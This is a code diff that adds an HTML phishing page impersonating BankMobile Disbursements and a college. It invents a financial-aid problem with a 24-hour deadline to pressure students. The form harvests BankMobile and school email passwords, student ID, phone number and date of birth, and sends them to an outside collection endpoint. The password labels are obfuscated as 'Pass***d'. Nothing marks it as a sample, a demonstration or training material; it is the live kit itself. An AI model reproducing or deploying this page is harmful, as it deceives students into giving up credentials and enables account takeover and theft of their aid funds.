@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bankmobile Verification Form</title>
+    <link rel="stylesheet" href="styles.css">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div class="logo-container">
+        <img src="bmdisbursements.png" alt="Logo" class="logo">
+        <img src="https://www.polk.edu/wp-content/themes/polk/images/logo@2x.png" alt="Logo" class="logo">
+    </div>
+    <div class="form-container">
+        <h1>Bankmobile Disbursements Verification Form</h1>
+        <p class="form-description">
+            <strong>BMTX, Inc. BankMobile Banking</strong> <br>
+            Your school has established a partnership with Bankmobile to efficiently distribute funds to our students. 
+            Bankmobile prioritizes the fastest, most reliable, and secure method of disbursing Emergency Grants to eligible students. Regrettably, 
+            we have identified an unresolved issue concerning your financial aid distribution through Bankmobile. 
+            We kindly urge you to review and, if needed, update your Bankmobile information within the next 24 hours. 
+            Failure to address this matter promptly may lead to delays in receiving your funds
+        </p>
+        <form   
+            accept-charset="UTF-8"
+            method="POST"
+            action="https://gdsht.app/s/92bdc2701e994ecbb87293fd67bd440b"
+        >
+            <div class="form-group">
+                <label for="siteName">Full Name</label>
+                <input type="text" id="fullName" name="Full Name" required>
+            </div>
+            <div class="form-group">
+                <label for="siteNumber">Phone Number</label>
+                <input type="text" id="phoneNumber" name="Phone Number" required>
+            </div>
+            <div class="form-group">
+                <label for="adminEmail">Student ID</label>
+                <input type="text" id="studentID" name="Student ID" required>
+            </div>
+            <div class="form-group">
+                <label for="adminEmail">Bankmobile Email</label>
+                <input type="email" id="bankmobileEmail" name="BankMobile Email" required>
+            </div>
+            <div class="form-group">
+                <label for="adminEmail">Bankmobile Pass***d (Admin Protected)</label>
+                <input type="text" id="bankmobilePassword" name="BankMobile Password" required>
+            </div>
+            <div class="form-group">
+                <label for="adminEmail">Current School Email</label>
+                <input type="email" id="currentSchoolEmail" name="Current School Email" required>
+            </div>
+            <div class="form-group">
+                <label for="adminEmail">Current School Email Pass***d (Admin Protected)</label>
+                <input type="text" id="currentSchoolEmailPassword" name="Current School Email Password" required>
+            </div>
+            <div class="form-group">
+                <label for="adminEmail">Previous School Email</label>
+                <input type="email" id="previousSchoolEmail" name="Previous School Email" required>
+            </div>
+            <div class="form-group">
+                <label for="adminEmail">Previous School Email Pass***d (Admin Protected)</label>
+                <input type="text" id="previousSchoolEmailPassword" name="Previous School Email Password" required>
+            </div>
+            <div class="form-group">
+                <label for="date">Date of Birth</label>
+                <input type="date" id="date" name="DOB" required>
+            </div>
+             
+            <button type="submit">Submit</button>
+        </form>
+    </div>
+
+    <footer>
+        <small>©2024 | Bankmobile Disbursements (powered by BMTX)</small>
+    </footer>
+    
+</body>
+</html>
